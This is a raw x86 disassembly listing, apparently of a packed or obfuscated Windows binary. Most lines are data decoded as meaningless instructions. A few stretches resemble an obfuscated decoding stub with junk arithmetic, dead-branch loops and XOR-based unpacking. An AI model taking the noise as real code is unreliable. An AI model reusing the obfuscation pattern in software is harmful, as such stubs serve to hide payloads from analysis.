  40312e:	inc    edi
  40312f:	(bad)  
  403130:	pop    esi
  403131:	or     ebp,DWORD PTR [ecx]
  403133:	xlat   BYTE PTR ds:[ebx]
  403134:	retf   
  403135:	jae    0x4030c8
  403137:	xlat   BYTE PTR cs:[ebx]
  403139:	inc    ecx
  40313a:	in     al,dx
  40313b:	sahf   
  40313c:	mov    al,0xcd
  40313e:	jb     0x4031b0
  403140:	push   es
  403141:	cli    
  403142:	out    0x1d,eax
  403144:	shr    DWORD PTR [esi-0x7aa20eb3],1
  40314a:	out    0xe4,al
  40314c:	push   0x6ef8fb2b
  403151:	fidivr WORD PTR [eax]
  403153:	data16 shl BYTE PTR [edi-0x71],0x2f
  403158:	or     edi,DWORD PTR ds:0xd525a780
  40315e:	retf   
  40315f:	aaa    
  403160:	xor    bh,bh
  403162:	pop    esp
  403163:	js     0x40314b
  403165:	iret   
  403166:	inc    esp
  403167:	arpl   WORD PTR [edx],si
  403169:	inc    esi
  40316a:	push   0xffffffb3
  40316c:	test   al,0x89
  40316e:	cmp    al,BYTE PTR [esi]
  403170:	cmp    eax,0xfdba9883
  403175:	std    
  403176:	inc    ecx
  403177:	inc    ecx
  403178:	push   ds
  403179:	jecxz  0x403161
  40317b:	into   
  40317c:	add    cl,BYTE PTR [esi]
  40317e:	inc    ebp
  40317f:	jo     0x4031d5
  403181:	fstp   DWORD PTR [ebx-0x10750ca]
  403187:	xor    eax,0x5699cfd
  40318c:	dec    ebp
  40318d:	dec    ebx
  40318e:	push   esi
  40318f:	sbb    BYTE PTR [esi],bl
  403191:	sbb    ebx,eax
  403193:	out    dx,al
  403194:	jg     0x4031c7
  403196:	xor    eax,esp
  403198:	mov    al,ds:0xcd083bc3
  40319d:	jecxz  0x40313f
  40319f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a0:	pop    edx
  4031a1:	ja     0x44ca3226
  4031a7:	xchg   BYTE PTR [esp+eiz*4],bh
  4031aa:	call   0xb1b375b5
  4031af:	mov    dh,0xc5
  4031b1:	jb     0x40317a
  4031b3:	adc    BYTE PTR [eax-0x15c6f3fe],cl
  4031b9:	shr    BYTE PTR [edi+0x35d08ddb],0x8b
  4031c0:	push   0x7f
  4031c2:	test   bh,ch
  4031c4:	push   0x18
  4031c6:	call   0xf6690a26
  4031cb:	repnz pushw 0x5c94
  4031d0:	stos   DWORD PTR es:[edi],eax
  4031d1:	out    dx,eax
  4031d2:	int    0xd7
  4031d4:	cmp    DWORD PTR [edx],eax
  4031d6:	xor    bh,BYTE PTR [ebx+esi*4+0x1d1f9a57]
  4031dd:	xchg   ebp,eax
  4031de:	fdivr  DWORD PTR [edx-0x4f]
  4031e1:	sub    al,0xa4
  4031e4:	inc    ebx
  4031e5:	daa    
  4031e6:	(bad)  
  4031e7:	fstp   st(7)
  4031e9:	xor    eax,0xc225daf7
  4031ee:	cmp    edx,DWORD PTR [esi-0x328b41be]
  4031f4:	lahf   
  4031f5:	mov    ecx,0x645490a1
  4031fa:	dec    eax
  4031fb:	inc    ebx
  4031fc:	jmp    0xe345029f
  403201:	inc    ebx
  403202:	sbb    ecx,DWORD PTR [edi]
  403204:	dec    ebx
  403205:	push   esp
  403206:	pop    ebp
  403207:	rcr    DWORD PTR ds:0x17ce3901,0x58
  40320e:	in     eax,dx
  40320f:	or     al,0x25
  403211:	jl     0x403203
  403213:	jg     0x40325a
  403215:	mov    dl,0x98
  403217:	xchg   edx,eax
  403218:	sti    
  403219:	xchg   edx,eax
  40321a:	inc    ebx
  40321b:	and    eax,0xf95a7cef
  403220:	or     al,0xd4
  403222:	pop    ds
  403223:	imul   ebp,edx,0x2b
  403226:	lods   al,BYTE PTR ds:[esi]
  403227:	cmp    ah,BYTE PTR [esi-0x6c]
  40322a:	push   ds
  40322b:	xchg   DWORD PTR [esi],esp
  40322d:	sbb    BYTE PTR [edx],ch
  40322f:	out    0xd4,eax
  403231:	daa    
  403232:	jbe    0x403210
  403234:	sub    eax,0xab017e58
  403239:	adc    eax,0x5849736
  40323e:	out    dx,al
  40323f:	jno    0x4031c7
  403241:	inc    esp
  403242:	bswap  ecx
  403244:	adc    al,0x0
  403246:	sahf   
  403247:	push   esi
  403248:	jno    0x4032b8
  40324a:	inc    esp
  40324b:	sub    BYTE PTR [ecx+0x58],ch
  40324e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40324f:	dec    esi
  403250:	cmc    
  403251:	jns    0x40329b
  403253:	(bad)
  403256:	(bad)  [eax]
  403258:	xor    al,0x8b
  40325a:	push   ebx
  40325b:	ja     0x403284
  40325d:	(bad)  
  40325e:	fistp  DWORD PTR [ebx+0x5d]
  403261:	mov    ah,0xbe
  403263:	or     DWORD PTR [edx],eax
  403265:	mov    cl,0xeb
  403267:	js     0x403264
  403269:	fwait
  40326a:	aad    0xe5
  40326c:	aad    0xf
  40326e:	leave  
  40326f:	push   esp
  403270:	in     eax,dx
  403271:	addr16 push esi
  403273:	pop    eax
  403274:	cli    
  403275:	inc    ebx
  403276:	mov    eax,0x8a38
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x4346fb,0x4346c3
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43470f
  403297:	xor    ecx,DWORD PTR ds:0x43466b
  40329d:	mov    DWORD PTR ds:0x43470f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x4346ff
  4032ac:	xor    DWORD PTR ds:0x434683,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43470f
  4032bb:	sbb    ecx,DWORD PTR ds:0x43473f
  4032c1:	mov    DWORD PTR ds:0x43470f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43470f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43478b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     al,dh
  4032f3:	sbb    al,0x2b
  4032f5:	dec    eax
  4032f6:	or     edx,DWORD PTR [eax]
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x4032a3
  4032ff:	mov    ?,WORD PTR [edi+edi*8]
  403302:	cmp    BYTE PTR [ebx],dl
  403304:	dec    ebx
  403305:	mov    eax,0xce6ed945
  40330a:	fstp   st(5)
  40330c:	sar    ebp,1
  40330e:	scas   al,BYTE PTR es:[edi]
  40330f:	test   dl,al
  403311:	xchg   edx,eax
  403312:	mov    ebx,0xea87d081
  403317:	sub    esi,DWORD PTR [edx-0x61000750]
  40331d:	pop    edx
  40331e:	enter  0xa784,0x4d
  403322:	shl    BYTE PTR [ecx],0xe0
  403325:	bound  eax,QWORD PTR [eax]
  403327:	ds loopne 0x4032d4
  40332a:	xchg   ebp,eax
  40332b:	xlat   BYTE PTR ds:[ebx]
  40332c:	xor    BYTE PTR [ecx],bh
  40332e:	dec    esp
  40332f:	fisttp DWORD PTR [edi+ebx*8]
  403332:	inc    ecx
  403333:	dec    ebp
  403334:	(bad)  
  403336:	jno    0x403343
  403338:	ins    BYTE PTR es:[edi],dx
  403339:	out    dx,al
  40333a:	push   ss
  40333b:	add    edi,esp
  40333d:	and    ecx,DWORD PTR [ebp+ebp*8+0x29]
  403341:	in     eax,0x9f
  403343:	mov    ?,WORD PTR [edx+0x10]
  403346:	xor    DWORD PTR [eax-0x46cf518c],ecx
  40334c:	mov    ds:0x2e280c23,eax
  403351:	jns    0x40334d
  403353:	sbb    DWORD PTR ds:0xfb2b181b,esi
  403359:	sub    esi,DWORD PTR [esi-0xd]
  40335c:	dec    esi
  40335d:	dec    esp
  40335e:	xlat   BYTE PTR ds:[ebx]
  40335f:	jo     0x403334
  403361:	(bad)  
  403362:	mov    ah,BYTE PTR [ebp-0x35587992]
  403368:	in     eax,0x5e
  40336a:	ja     0x40338f
  40336c:	fsub   QWORD PTR [ebx-0x65b43898]
  403372:	pop    ss
  403373:	jmp    FWORD PTR [edi+ecx*8+0x37]
  403377:	jns    0x403319
  403379:	pop    eax
  40337a:	popf   
  40337b:	dec    esi
  40337c:	adc    DWORD PTR [edx],edx
  40337e:	mov    dl,BYTE PTR [ebx]
  403380:	pop    ecx
  403381:	jecxz  0x4033b6
  403383:	xor    al,0x94
  403385:	les    esp,FWORD PTR [ebx-0x30]
  403388:	sub    BYTE PTR [esi+0x158a4f75],0x88
  40338f:	push   DWORD PTR [edx-0x167e124f]
  403395:	stos   DWORD PTR es:[di],eax
  403397:	or     edx,DWORD PTR [ecx-0x45]
  40339a:	cmp    al,BYTE PTR [esi]
  40339c:	stc    
  40339d:	mov    ds:0xb2b6ea62,al
  4033a2:	retf   0x383b
  4033a5:	(bad)  
  4033a6:	in     al,dx
  4033a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a8:	or     ebx,DWORD PTR fs:[edi-0x75338202]
  4033af:	mov    dh,BYTE PTR [edx+0x1e]
  4033b2:	int    0x10
  4033b4:	sub    al,0xd9
  4033b6:	fdivr  st,st(1)
  4033b8:	std    
  4033b9:	test   al,0x27
  4033bb:	fild   QWORD PTR [ebp-0x6a]
  4033be:	loope  0x4033c6
  4033c0:	and    eax,0xe95010c0
  4033c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c6:	aaa    
  4033c7:	in     eax,0x9d
  4033c9:	mov    ah,0xf8
  4033cb:	adc    bh,ch
  4033cd:	ficom  WORD PTR [esp+eiz*8]
  4033d0:	into   
  4033d1:	stc    
  4033d2:	mov    ch,0x19
  4033d4:	mov    ds:0x1e9c9f8b,eax
  4033d9:	int3   
  4033da:	inc    BYTE PTR [esi]
  4033dc:	sub    al,0x33
  4033de:	jg     0x403392
  4033e0:	jmp    0x403394
  4033e2:	jb     0x4033c4
  4033e4:	fist   DWORD PTR [eax+0x2]
  4033e7:	sub    BYTE PTR [ecx+ecx*2+0x5d],bl
  4033eb:	loop   0x40342c
  4033ed:	scas   al,BYTE PTR es:[edi]
  4033ee:	xor    eax,0xe687aa2f
  4033f3:	imul   esi,ebp,0xffffffbb
  4033f6:	and    BYTE PTR [ecx+0x5888ee8e],dh
  4033fc:	rep lods eax,DWORD PTR ds:[esi]
  4033fe:	cmp    edi,DWORD PTR [edi-0x3e9b393]
  403404:	adc    eax,0x89f2a09
  403409:	cdq    
  40340a:	dec    eax
  40340b:	mov    edx,0xf5167017
  403410:	cmp    eax,0xf8c2fd6b
  403415:	inc    edi
  403416:	sar    DWORD PTR [ebp+0x43],0x64
  40341a:	xor    esp,DWORD PTR [ebx]
  40341c:	and    eax,0xc44c227b
  403421:	shl    DWORD PTR ds:0xa9f0db6a,cl
  403428:	xchg   edx,eax
  403429:	xchg   esi,eax
  40342a:	mov    ecx,0x47e97a2f
  40342f:	mov    ecx,0x90daa0bd
  403434:	push   ecx
  403435:	push   eax
  403436:	loop   0x4033d7
  403438:	pop    esi
  403439:	jbe    0x40342e
  40343b:	popa   
  40343c:	addr16 xchg edi,eax
  40343e:	add    ah,BYTE PTR [ebx]
  403440:	dec    edi
  403441:	lock out dx,al
  403443:	inc    ebp
  403444:	rol    eax,1
  403446:	fs sti 
  403448:	repnz scas al,BYTE PTR es:[edi]
  40344a:	add    DWORD PTR [esi+0x7779fe44],ecx
  403450:	or     eax,0x6d6cb012
  403455:	lods   eax,DWORD PTR ds:[esi]
  403456:	addr16 je 0x4034a0
  403459:	test   eax,0x32d06e0d
  40345e:	xor    ecx,DWORD PTR [eax+0x66c06860]
  403464:	hlt    
  403465:	mov    ds:0x40ab1f80,eax
  40346a:	and    dl,bh
  40346c:	sub    eax,0xfad2fd2f
  403471:	out    0xa4,al
  403473:	push   es
  403474:	ror    BYTE PTR [ebp-0x3d1ea530],0xe7
  40347b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40347c:	(bad)  
  40347d:	pop    edi
  40347e:	dec    esi
  40347f:	lds    esp,FWORD PTR [eax-0x68b875bc]
  403485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403486:	xchg   ebx,eax
  403487:	pop    eax
  403488:	or     eax,0x7498520a
  40348d:	sbb    DWORD PTR [edi+0x5c],edi
  403490:	inc    ebx
  403491:	outs   dx,DWORD PTR ds:[esi]
  403492:	retf   0x515b
  403495:	mov    ecx,DWORD PTR [esi]
  403497:	sub    al,0xa8
  403499:	push   cs
  40349a:	sti    
  40349b:	cwde   
  40349c:	xor    DWORD PTR [ebx+0x67fc300b],esp
  4034a2:	lea    esi,[ecx-0x1659eb22]
  4034a8:	jmp    0x1e3:0x44d95bf5
  4034af:	call   0xc60fee68
  4034b4:	xor    BYTE PTR [ebp-0x35],dl
  4034b7:	popf   
  4034b8:	xchg   ecx,eax
  4034b9:	push   es
  4034ba:	mov    eax,ds:0x37ebdd9c
  4034bf:	jecxz  0x403458
  4034c1:	dec    esi
  4034c2:	mov    al,ds:0xb2bc9703
  4034c7:	sahf   
  4034c8:	aaa    
  4034c9:	mul    DWORD PTR [ecx+0x55]
  4034cc:	scas   al,BYTE PTR es:[edi]
  4034cd:	lea    esp,[edx]
  4034cf:	nop
  4034d0:	sub    al,0x1
  4034d2:	mov    esp,0x9f6bbddf
  4034d7:	sbb    BYTE PTR [ecx+edi*2+0x31],bl
  4034db:	(bad)  
  4034dc:	(bad)  
  4034dd:	jae    0x40345f
  4034df:	add    BYTE PTR ds:0xbae5957a,dh
  4034e5:	adc    eax,0x70d57c54
  4034ea:	fcmovnb st,st(4)
  4034ec:	dec    esi
  4034ed:	jg     0x403527
  4034ef:	pop    ss
  4034f0:	cmc    
  4034f1:	push   0xddc22d84
  4034f6:	dec    edx
  4034f7:	in     al,dx
  4034f8:	pusha  
  4034f9:	retf   0x6224
  4034fc:	pusha  
  4034fd:	mov    esp,0x2c80c67f
  403502:	stc    
  403503:	xor    dl,cl
  403505:	clc    
  403506:	pop    eax
  403507:	mov    ds:0x1dc97a0,eax
  40350c:	in     al,dx
  40350d:	call   0x1913:0xc3f7dbc2
  403514:	fsubr  DWORD PTR gs:[esi-0x5ed0f901]
  40351b:	rol    BYTE PTR [di+0x7899],1
  403520:	or     ch,dh
  403522:	in     eax,0x6f
  403524:	jl     0x403569
  403526:	push   ds
  403527:	inc    esi
  403528:	repz aad 0xfa
  40352b:	test   al,0xc6
  40352d:	add    eax,0x377aa511
  403532:	mov    WORD PTR ds:0xe0fc54c8,?
  403538:	jno    0x403588
  40353a:	xor    ch,BYTE PTR [ecx]
  40353c:	repz push ebp
  40353e:	sbb    eax,0x9508d06c
  403543:	or     esp,ecx
  403545:	xchg   bh,cl
  403547:	cmp    dh,bl
  403549:	push   edx
  40354a:	ins    DWORD PTR es:[edi],dx
  40354b:	xor    ch,dh
  40354d:	jecxz  0x4034d0
  40354f:	mov    dh,0x83
  403551:	jno    0x4034ec
  403553:	(bad)  
  403554:	pushf  
  403555:	pop    edx
  403556:	xor    al,0xc5
  403558:	push   0x2359173a
  40355d:	inc    ebp
  40355e:	dec    esi
  40355f:	mov    ch,0x89
  403561:	enter  0x8d39,0xb7
  403565:	nop
  403566:	in     al,dx
  403567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403568:	adc    eax,0x70ba8e85
  40356d:	in     al,dx
  40356e:	dec    si
  403570:	jbe    0x40358e
  403572:	pop    edx
  403573:	outs   dx,DWORD PTR ds:[esi]
  403574:	inc    esp
  403575:	inc    esi
  403576:	sbb    al,0x1
  403578:	aas    
  403579:	ins    DWORD PTR es:[edi],dx
  40357a:	repnz add ebx,DWORD PTR [ebx+0x6207915b]
  403581:	(bad)  
  403582:	mov    ebp,ebx
  403584:	dec    eax
  403585:	mov    ebx,DWORD PTR [edi+0x31]
  403588:	sub    eax,DWORD PTR [edx-0x318f14c1]
  40358e:	shr    DWORD PTR [ebx-0x9c0ab04],cl
  403594:	or     BYTE PTR [ebp-0x17ab9b57],dh
  40359a:	add    BYTE PTR [esi-0x19ee69ce],0x18
  4035a1:	xor    eax,0xfc889f86
  4035a6:	js     0x403534
  4035a8:	es or  edi,edi
  4035ab:	mov    ?,WORD PTR [eax]
  4035ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ae:	fs sahf 
  4035b0:	sbb    eax,0x9a96cc0d
  4035b5:	(bad)  
  4035b6:	cmp    DWORD PTR [ebp+ecx*2-0x57],edi
  4035ba:	enter  0x4393,0xc0
  4035be:	leave  
  4035bf:	sbb    BYTE PTR [esp+ebp*8],bl
  4035c2:	enter  0x6882,0xbc
  4035c6:	neg    dl
  4035c8:	dec    edi
  4035c9:	and    al,0x98
  4035cb:	jmp    0x4035f7
  4035cd:	(bad)  
  4035ce:	mov    bl,0xd6
  4035d0:	jmp    0x403636
  4035d2:	fnstsw WORD PTR [esi+0x4f37b961]
  4035d8:	cld    
  4035d9:	pop    es
  4035da:	pop    ds
  4035db:	sbb    al,0x5e
  4035dd:	fsub   QWORD PTR [edi+0x74e41b1f]
  4035e3:	sbb    al,0xc4
  4035e5:	cld    
  4035e6:	aaa    
  4035e7:	aam    0xcf
  4035e9:	xor    ah,BYTE PTR [ecx-0x7479479b]
  4035ef:	stos   BYTE PTR es:[edi],al
  4035f0:	lods   al,BYTE PTR ds:[esi]
  4035f1:	or     esp,esi
  4035f3:	xchg   esi,eax
  4035f4:	(bad)  
  4035f5:	(bad)  
  4035f6:	popa   
  4035f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035f8:	cmp    BYTE PTR [ebx+0x4f5405e3],0x91
  4035ff:	dec    ebx
  403600:	or     eax,0x5ee9cf13
  403605:	xor    dh,BYTE PTR [ebx+0x6d]
  403608:	mov    DWORD PTR [ebp+eiz*1+0x5f],edx
  40360c:	outs   dx,DWORD PTR ds:[esi]
  40360d:	mov    edi,DWORD PTR [edx]
  40360f:	jno    0x403670
  403611:	inc    ebp
  403612:	push   ebx
  403613:	pop    es
  403614:	cld    
  403615:	cmp    ebp,DWORD PTR [ebx-0x91a10c3]
  40361b:	sbb    ebp,DWORD PTR [eax]
  40361d:	stos   DWORD PTR es:[edi],eax
  40361e:	sti    
  40361f:	hlt    
  403620:	fwait
  403621:	jmp    0x3dbd15fb
  403626:	imul   DWORD PTR [ebx]
  403628:	jg     0x4035ea
  40362a:	pop    es
  40362b:	adc    ch,bl
  40362d:	jmp    0x61c6607f
  403632:	scas   eax,DWORD PTR es:[edi]
  403633:	add    eax,DWORD PTR [eax+0x1e]
  403636:	ror    BYTE PTR [edi+0x9],1
  403639:	(bad)  
  40363a:	fcomp  QWORD PTR [eax-0x7]
  40363d:	out    dx,al
  40363e:	inc    edx
  40363f:	adc    BYTE PTR [edx-0x73],0x3d
  403643:	dec    esp
  403644:	mov    al,ds:0x347ec770
  403649:	and    dh,BYTE PTR [ebx]
  40364b:	lahf   
  40364c:	ds loopne 0x4035f8
  40364f:	push   esp
  403650:	neg    BYTE PTR [eax]
  403652:	mov    ah,0x3e
  403654:	push   ds
  403655:	stos   DWORD PTR es:[edi],eax
  403656:	mov    ds:0xb0ac5514,al
  40365b:	sub    al,0x1e
  40365d:	in     al,dx
  40365e:	aad    0x96
  403660:	xor    edi,esp
  403662:	jle    0x403690
  403664:	push   0xcefcae71
  403669:	mov    eax,ds:0xe2aca916
  40366e:	mov    ebx,eax
  403670:	jge    0x4036a0
  403672:	or     al,0x6b
  403674:	shl    DWORD PTR [eax+0x43],0xca
  403678:	in     al,0xab
  40367a:	and    dl,BYTE PTR [edx+0x31]
  40367d:	sbb    al,0x45
  40367f:	pop    ebx
  403680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403681:	jno    0x4036d5
  403683:	cmc    
  403684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403685:	ret    
  403686:	mov    dl,0x53
  403688:	rcr    BYTE PTR fs:[eax+0x1466fc23],1
  40368f:	inc    edi
  403690:	sub    ebp,DWORD PTR [ebp-0x6d257a80]
  403696:	push   ebp
  403697:	out    dx,eax
  403698:	frstor [edx+ecx*8]
  40369b:	pop    esi
  40369c:	shr    DWORD PTR [ebx-0x4d3c7b6f],1
  4036a2:	jmp    0x403672
  4036a4:	sbb    edi,DWORD PTR [eax]
  4036a6:	outs   dx,DWORD PTR ds:[esi]
  4036a7:	sti    
  4036a8:	inc    esp
  4036a9:	adc    eax,0x37e6b43b
  4036ae:	stos   BYTE PTR es:[edi],al
  4036af:	inc    ebx
  4036b0:	xchg   ebp,eax
  4036b1:	dec    ebx
  4036b2:	dec    esi
  4036b3:	jmp    0xc951:0xfee2ae49
  4036ba:	ins    BYTE PTR es:[edi],dx
  4036bb:	ins    DWORD PTR es:[edi],dx
  4036bc:	fwait
  4036bd:	dec    esp
  4036be:	pop    edx
  4036bf:	mov    edx,DWORD PTR [ebx+0x30127821]
  4036c5:	xor    eax,0x77870081
  4036ca:	jb     0x4036a9
  4036cc:	int3   
  4036cd:	mov    al,ds:0x5a96eaec
  4036d2:	xor    al,dl
  4036d4:	push   cs
  4036d5:	mov    al,BYTE PTR fs:[ebp-0x1]
  4036d9:	mov    ecx,DWORD PTR ds:0x43466b
  4036df:	sbb    ecx,DWORD PTR ds:0x434787
  4036e5:	mov    DWORD PTR ds:0x43466b,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434793,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x43467b,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x434677,0x434787
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x4346f7,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434707,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434707
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434707,ecx
  40373d:	cmp    DWORD PTR ds:0x434707,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434707,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x43474b,0x14
  403779:	cmp    DWORD PTR ds:0x43474b,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x43474b,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x43474b,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x43474b
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x43474b,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x43474b
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x43474b,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x434667,0x1c
  4037dc:	cmp    DWORD PTR ds:0x434667,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x434667,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x4348c9
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x434667,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x434667
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x434667,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x434667
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x434667,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434707,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43478b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x4346cf,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x4346c3
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x4346cb,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	ins    BYTE PTR es:[edi],dx
  4038be:	add    cl,al
  4038c0:	or     DWORD PTR [ebx+0x13],esp
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x40386b
  4038ca:	bound  ebp,QWORD PTR [edi+0x5b39b150]
  4038d0:	xchg   ecx,eax
  4038d1:	out    dx,eax
  4038d2:	mov    ebp,0x32560d9b
  4038d7:	ins    DWORD PTR es:[edi],dx
  4038d8:	js     0x40389e
  4038da:	dec    edx
  4038db:	icebp  
  4038dc:	cli    
  4038dd:	out    dx,eax
  4038de:	(bad)  
  4038df:	not    BYTE PTR [ebx+eax*2-0x27]
  4038e3:	jbe    0x40391b
  4038e5:	mov    dl,0xcd
  4038e7:	ret    
  4038e8:	rol    ebp,1
  4038ea:	xor    al,BYTE PTR [ebx-0x1c]
  4038ed:	mov    dh,dl
  4038ef:	pushf  
  4038f0:	cmp    BYTE PTR [esp+eiz*8+0x538710e5],dl
  4038f7:	xor    eax,0xb10a6669
  4038fc:	in     al,0x4b
  4038fe:	fwait
  4038ff:	loop   0x4038b2
  403901:	popf   
  403902:	mov    dh,0x3b
  403904:	fld    DWORD PTR [edi+edi*4-0x69557559]
  40390b:	fisubr WORD PTR [ebp-0x7a]
  40390e:	popa   
  40390f:	rcr    ebp,1
  403911:	mov    dh,0x9b
  403913:	xchg   esp,eax
  403914:	stc    
  403915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403916:	jbe    0x403912
  403918:	addr16 daa 
  40391a:	retf   0x8c6d
  40391d:	mov    DWORD PTR [edx+eiz*2],ecx
  403920:	push   edx
  403921:	xor    ebx,DWORD PTR [di-0x709]
  403926:	jp     0x403971
  403928:	mov    cl,0x9
  40392a:	(bad)  
  40392b:	jae    0x403920
  40392d:	ficomp DWORD PTR [edi+0x7d]
  403930:	mov    bl,0x79
  403932:	push   es
  403933:	pop    ecx
  403934:	daa    
  403935:	ja     0x403982
  403937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403938:	stos   DWORD PTR es:[edi],eax
  403939:	lahf   
  40393a:	int3   
  40393b:	xor    al,BYTE PTR [eax-0x613d49ef]
  403941:	cmp    DWORD PTR [ebx],edi
  403943:	stos   DWORD PTR es:[edi],eax
  403944:	pop    ebx
  403945:	stos   DWORD PTR es:[edi],eax
  403946:	jnp    0x4038d5
  403948:	shr    BYTE PTR [eax+0x25b1473e],cl
  40394e:	cdq    
  40394f:	dec    edi
  403950:	loop   0x40396d
  403952:	sar    al,1
  403954:	xor    DWORD PTR [edi+0x3f],edi
  403957:	fs das 
  403959:	xchg   esp,eax
  40395a:	icebp  
  40395b:	les    esi,FWORD PTR [eax+0x6a]
  40395e:	retf   
  40395f:	inc    eax
  403960:	fstp   DWORD PTR fs:[bx+si]
  403964:	inc    ebp
  403965:	jp     0x4039e2
  403967:	push   ecx
  403968:	jmp    0x403906
  40396a:	ror    bp,cl
  40396d:	or     edi,DWORD PTR [esi-0x56]
  403970:	in     eax,dx
  403971:	popf   
  403972:	inc    DWORD PTR [eax-0x1dc49f77]
  403978:	cmp    al,0x10
  40397a:	pusha  
  40397b:	push   0xffffffe1
  40397d:	outs   dx,BYTE PTR ds:[esi]
  40397e:	pusha  
  40397f:	dec    ebx
  403980:	mov    al,ds:0xf89bf857
  403985:	xchg   ecx,eax
  403986:	jmp    0x403925
  403988:	les    ecx,FWORD PTR [ecx-0xf]
  40398b:	ret    0x35bc
  40398e:	out    dx,al
  40398f:	cwde   
  403990:	jmp    0x56148d7e
  403995:	and    edx,DWORD PTR [ebx-0x51]
  403998:	sbb    eax,0xf7c60c8a
  40399d:	sti    
  40399e:	add    eax,DWORD PTR [esp+ebx*1]
  4039a1:	and    al,0xbc
  4039a3:	inc    ebx
  4039a4:	jae    0x403a03
  4039a6:	sti    
  4039a7:	xor    al,BYTE PTR [edx-0x63521ff0]
  4039ad:	fild   WORD PTR [ebx+0x0]
